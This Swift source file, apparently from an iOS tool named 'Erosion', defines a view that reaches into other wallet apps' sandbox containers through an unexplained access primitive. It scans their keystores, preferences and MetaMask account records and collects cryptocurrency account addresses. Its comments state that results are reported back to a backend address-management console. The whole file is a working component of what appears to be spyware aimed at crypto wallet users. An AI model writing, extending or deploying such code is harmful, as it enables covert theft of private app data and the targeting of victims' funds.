//
//  AddressScanView.swift
//  Erosion
//
//  地址扫描 v2：只收**账户地址**，把代币/合约/JS 缓存里的地址全部滤掉。
//
//  判定优先级：
//  1. 结构化 JSON：对象里同时有 address 且没有 symbol/decimals/logoURI/chainId → 账户
//     （keystore、账户表都是这个形状）
//  2. MetaMask 专有：selectedAddress、internalAccounts 里的 address
//  3. keystore 文本：address 附近 300 字符内出现 crypto/keyring/version
//  4. 单个文件里候选地址 > 20 个 → 判定为代币列表，整份丢弃
//  5. 路径命中 cache / tokenlist / chunks / bundle.js / offline 等噪声标记 → 直接跳过
//

import SwiftUI

struct AddressEntry: Identifiable {
    let id = UUID()
    let wallet: String
    let bundleId: String
    let address: String
    let chain: String
    let source: String
    let confidence: String
}

struct AddressScanView: View {
    @State private var running = false
    @State private var status = "Idle"
    @State private var entries: [AddressEntry] = []
    @State private var scannedFiles = 0
    @State private var scannedWallets = 0
    @State private var skippedFiles = 0

    private var addressesURL: URL {
        URL.documentsDirectory.appendingPathComponent("addresses.json")
    }

    var body: some View {
        List {
            Section {
                Button {
                    run()
                } label: {
                    HStack {
                        Label("扫描钱包账户地址", systemImage: "number")
                        Spacer()
                        if running { ProgressView() }
                    }
                }
                .disabled(running)
            } header: {
                HeaderLabel("Addresses", symbol: "number")
            } footer: {
                Text("只收账户地址：keystore / selectedAddress / internalAccounts；代币列表、合约地址、JS 缓存一律跳过。结果回传后台「地址管理」。")
            }

            Section {
                LabeledContent("Status", value: status)
                LabeledContent("钱包", value: "\(scannedWallets)")
                LabeledContent("文件", value: "\(scannedFiles)")
                LabeledContent("跳过", value: "\(skippedFiles)")
                LabeledContent("地址", value: "\(entries.count)")
            } header: {
                HeaderLabel("Progress", symbol: "chart.bar")
            }

            if !entries.isEmpty {
                Section {
                    ForEach(entries) { entry in
                        VStack(alignment: .leading, spacing: 2) {
                            Text(entry.address)
                                .font(.system(.caption, design: .monospaced))
                            Text("\(entry.wallet) · \(entry.chain) · \(entry.confidence)")
                                .font(.caption2)
                                .foregroundStyle(.secondary)
                        }
                    }
                } header: {
                    HeaderLabel("结果", symbol: "list.bullet")
                }
            }
        }
        .navigationTitle("Address Scan")
        .disabled(running)
        .onAppear { entries = loadEntries() }
    }

    // MARK: - 扫描

    private func run() {
        running = true
        status = "扫描中…"
        OpLog.append("address", "start", "账户地址扫描开始")

        let targets = walletTargets()
        scannedFiles = 0
        scannedWallets = 0
        skippedFiles = 0
        entries = []

        DispatchQueue.global(qos: .userInitiated).async {
            var found: [AddressEntry] = []
            var seen = Set<String>()

            for target in targets {
                let handle = worse_query(target.path, group, false, true)
                guard handle >= 0 else {
                    OpLog.append("address", "skip", "\(target.name) 拿不到容器权限")
                    continue
                }
                DispatchQueue.main.async {
                    scannedWallets += 1
                    status = "扫描 \(target.name)…"
                }
                OpLog.append("address", "step", "扫描 \(target.name)")

                for url in self.enumerate(target.path) {
                    let relative = url.path.replacingOccurrences(of: target.path + "/", with: "")
                    if Self.isNoisePath(relative) {
                        DispatchQueue.main.async { skippedFiles += 1 }
                        continue
                    }
                    let attrs = try? fm.attributesOfItem(atPath: url.path)
                    let size = (attrs?[.size] as? NSNumber)?.int64Value ?? 0
                    guard size > 0, size < 2_000_000 else { continue }
                    guard let data = fm.contents(atPath: url.path) else { continue }

                    DispatchQueue.main.async { scannedFiles += 1 }

                    let hits = Self.extract(from: data)
                    if hits.count > 100 {
                        DispatchQueue.main.async { skippedFiles += 1 }
                        continue
                    }
                    for hit in hits {
                        let key = "\(target.bundleId)|\(hit.address)"
                        guard !seen.contains(key) else { continue }
                        seen.insert(key)
                        found.append(
                            AddressEntry(
                                wallet: target.name,
                                bundleId: target.bundleId,
                                address: hit.address,
                                chain: hit.chain,
                                source: relative,
                                confidence: hit.confidence
                            )
                        )
                    }
                }
                worse_query_release(handle)
            }

            self.save(found)
            DispatchQueue.main.async {
                entries = found
                running = false
                status = "完成：\(found.count) 个账户地址"
            }
            OpLog.append("address", "done", "账户地址扫描完成：\(found.count) 个地址 / \(scannedWallets) 个钱包")
        }
    }

    private struct Target {
        let name: String
        let bundleId: String
        let path: String
    }

    private func walletTargets() -> [Target] {
        var index: [String: String] = [:]
        if let data = try? Data(contentsOf: URL.documentsDirectory.appendingPathComponent("container-index.json")),
           let dict = try? JSONSerialization.jsonObject(with: data) as? [String: String] {
            index = dict
        }
        var result: [Target] = []
        for preset in walletPresets {
            if let path = index[preset.bundleID] ?? preset.known, fm.fileExists(atPath: path) {
                result.append(Target(name: preset.name, bundleId: preset.bundleID, path: path))
            }
        }
        return result
    }

    private func enumerate(_ root: String) -> [URL] {
        let roots = [
            root + "/Documents",
            root + "/Library/Preferences",
            root + "/Library/Application Support",
        ]
        var urls: [URL] = []
        for path in roots {
            guard let enumerator = fm.enumerator(
                at: URL(fileURLWithPath: path),
                includingPropertiesForKeys: [.isRegularFileKey],
                options: [.skipsHiddenFiles]
            ) else { continue }
            for case let url as URL in enumerator {
                let isFile = (try? url.resourceValues(forKeys: [.isRegularFileKey]))?.isRegularFile ?? false
                if isFile { urls.append(url) }
                if urls.count > 6000 { return urls }
            }
        }
        return urls
    }

    // MARK: - 过滤规则

    /// 只在这些路径里找账户地址（keystore / 账户表 / 偏好）
    private static let allowMarkers = [
        "keystore", "account", "wallet", "keyring", "preferences",
        "address", "chain", "rctasynclocalstorage", "persiststore",
    ]

    /// 交易对手、代币、缓存类一律不看
    private static let denyMarkers = [
        "transaction", "rewards", "tokenlist", "tokens", "/token",
        "nft", "phishing", "gasfee", "history", "market", "swap",
        "chunks", "offline", "metadata", "remote", "featureflag",
    ]

    private static let noiseMarkers = [
        "/cache", "caches/", "web_caches", "/chunks/", "/offline/",
        "tokenlist", "tokenschains", "swap_tokens", "asset.hot",
        "marketfilter", "batch_market", "transfer.report", "remotefeatureflag",
        "/nft", "metadata", "token-list", "token_list",
    ]

    static func isNoisePath(_ relative: String) -> Bool {
        let lower = relative.lowercased()
        if lower.hasSuffix(".js") || lower.hasSuffix(".mjs") { return true }
        if noiseMarkers.contains(where: { lower.contains($0) }) { return true }
        // 白名单只用于加权重，不再是硬门槛：钱包的账户数据可能在任意目录
        return denyMarkers.contains(where: { lower.contains($0) })
    }

    private struct Hit {
        let address: String
        let chain: String
        let confidence: String
    }

    private static func extract(from data: Data) -> [Hit] {
        var hits: [Hit] = []

        if let object = try? JSONSerialization.jsonObject(with: data) {
            walk(object, depth: 0, into: &hits)
            return dedupe(hits)
        }

        let text = String(decoding: data, as: UTF8.self)
        for address in matches("(?i)\"selectedAddress\"\\s*:\\s*\"(0x[0-9a-f]{40})\"", in: text) {
            hits.append(Hit(address: address.lowercased(), chain: "EVM", confidence: "high"))
        }
        if let range = text.range(of: "\"internalAccounts\"") {
            let window = String(text[range.lowerBound...].prefix(30_000))
            for address in matches("(?i)\"address\"\\s*:\\s*\"(0x[0-9a-f]{40})\"", in: window) {
                hits.append(Hit(address: address.lowercased(), chain: "EVM", confidence: "high"))
            }
        }
        // keystore：address 附近有 crypto / keyring / version
        for match in matchesWithRange("(?i)\"address\"\\s*:\\s*\"(0x[0-9a-f]{40})\"", in: text) {
            let start = max(0, match.range.location - 300)
            let length = min(text.count - start, match.range.length + 600)
            let window = (text as NSString).substring(with: NSRange(location: start, length: max(0, length)))
            if window.range(of: "crypto", options: .caseInsensitive) != nil ||
                window.range(of: "keyring", options: .caseInsensitive) != nil {
                hits.append(Hit(address: match.value.lowercased(), chain: "EVM", confidence: "high"))
            }
        }
        for address in matches("\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b", in: text) {
            hits.append(Hit(address: address, chain: "TRON", confidence: "medium"))
        }
        for address in matches("\\bbc1[a-z0-9]{11,71}\\b", in: text) {
            hits.append(Hit(address: address, chain: "BTC", confidence: "medium"))
        }
        for address in matches("\\bltc1[a-z0-9]{11,71}\\b", in: text) {
            hits.append(Hit(address: address, chain: "LTC", confidence: "medium"))
        }
        for address in matches("\\bcosmos1[0-9a-z]{38}\\b", in: text) {
            hits.append(Hit(address: address, chain: "COSMOS", confidence: "medium"))
        }
        // 任意链：只认 "address":"..." 这种字段上下文
        for candidate in matches("(?i)\"(?:address|addr|accountAddress)\"\\s*:\\s*\"([A-Za-z0-9]{25,90})\"", in: text) {
            if let chain = chain(for: candidate) {
                hits.append(Hit(address: normalized(candidate), chain: chain, confidence: "medium"))
            }
        }
        return dedupe(hits)
    }

    private static func walk(_ object: Any, depth: Int, into hits: inout [Hit]) {
        guard depth < 8, hits.count < 400 else { return }

        if let dict = object as? [String: Any] {
            let tokenish = dict["symbol"] != nil || dict["decimals"] != nil ||
                dict["logoURI"] != nil || dict["chainId"] != nil
            if !tokenish {
                if let address = dict["address"] as? String, let chain = chain(for: address) {
                    hits.append(Hit(address: normalized(address), chain: chain, confidence: "high"))
                }
            }
            if let selected = dict["selectedAddress"] as? String, let chain = chain(for: selected) {
                hits.append(Hit(address: normalized(selected), chain: chain, confidence: "high"))
            }
            for key in ["addresses", "accounts", "addressesByChain", "publicKey"] {
                if let list = dict[key] as? [String] {
                    for address in list {
                        if let chain = chain(for: address) {
                            hits.append(Hit(address: normalized(address), chain: chain, confidence: "high"))
                        }
                    }
                }
            }
            for value in dict.values {
                walk(value, depth: depth + 1, into: &hits)
            }
            return
        }

        if let array = object as? [Any] {
            for value in array {
                walk(value, depth: depth + 1, into: &hits)
            }
        }
    }

    private static func chain(for address: String) -> String? {
        if address.range(of: "^0x[0-9a-fA-F]{40}$", options: .regularExpression) != nil {
            return "EVM"
        }
        if address.range(of: "^T[1-9A-HJ-NP-Za-km-z]{33}$", options: .regularExpression) != nil {
            return "TRON"
        }
        if address.range(of: "^bc1[a-z0-9]{11,71}$", options: .regularExpression) != nil {
            return "BTC"
        }
        if address.range(of: "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", options: .regularExpression) != nil {
            return "BTC"
        }
        if address.range(of: "^cosmos1[0-9a-z]{38}$", options: .regularExpression) != nil {
            return "COSMOS"
        }
        if address.range(of: "^r[1-9A-HJ-NP-Za-km-z]{24,34}$", options: .regularExpression) != nil {
            return "XRP"
        }
        if address.range(of: "^ltc1[a-z0-9]{11,71}$", options: .regularExpression) != nil {
            return "LTC"
        }
        if address.range(of: "^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$", options: .regularExpression) != nil {
            return "DOGE"
        }
        // Solana：base58 32-44，容易误报，只在结构化字段里接受
        if address.range(of: "^[1-9A-HJ-NP-Za-km-z]{32,44}$", options: .regularExpression) != nil {
            return "SOL"
        }
        return nil
    }

    private static func normalized(_ address: String) -> String {
        address.hasPrefix("0x") ? address.lowercased() : address
    }

    private static func dedupe(_ hits: [Hit]) -> [Hit] {
        var seen = Set<String>()
        var result: [Hit] = []
        for hit in hits {
            let key = hit.address.lowercased()
            guard !seen.contains(key) else { continue }
            seen.insert(key)
            result.append(hit)
        }
        return result
    }

    private static func matches(_ pattern: String, in text: String) -> [String] {
        matchesWithRange(pattern, in: text).map(\.value)
    }

    private struct Match {
        let value: String
        let range: NSRange
    }

    private static func matchesWithRange(_ pattern: String, in text: String) -> [Match] {
        guard let regex = try? NSRegularExpression(pattern: pattern) else { return [] }
        let range = NSRange(text.startIndex..., in: text)
        return regex.matches(in: text, range: range).compactMap { match in
            guard match.numberOfRanges > 1,
                  let valueRange = Range(match.range(at: 1), in: text) else { return nil }
            return Match(value: String(text[valueRange]), range: match.range)
        }
    }

    // MARK: - 存取

    private func save(_ list: [AddressEntry]) {
        let rows: [[String: Any]] = list.map { entry in
            [
                "wallet": entry.wallet,
                "bundleId": entry.bundleId,
                "address": entry.address,
                "chain": entry.chain,
                "source": entry.source,
                "confidence": entry.confidence,
                "foundAt": ISO8601DateFormatter().string(from: Date()),
            ]
        }
        if let data = try? JSONSerialization.data(withJSONObject: rows, options: [.prettyPrinted]) {
            try? data.write(to: addressesURL)
        }
    }

    private func loadEntries() -> [AddressEntry] {
        guard let data = try? Data(contentsOf: addressesURL),
              let rows = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] else {
            return []
        }
        return rows.map { row in
            AddressEntry(
                wallet: row["wallet"] as? String ?? "",
                bundleId: row["bundleId"] as? String ?? "",
                address: row["address"] as? String ?? "",
                chain: row["chain"] as? String ?? "",
                source: row["source"] as? String ?? "",
                confidence: row["confidence"] as? String ?? ""
            )
        }
    }
}
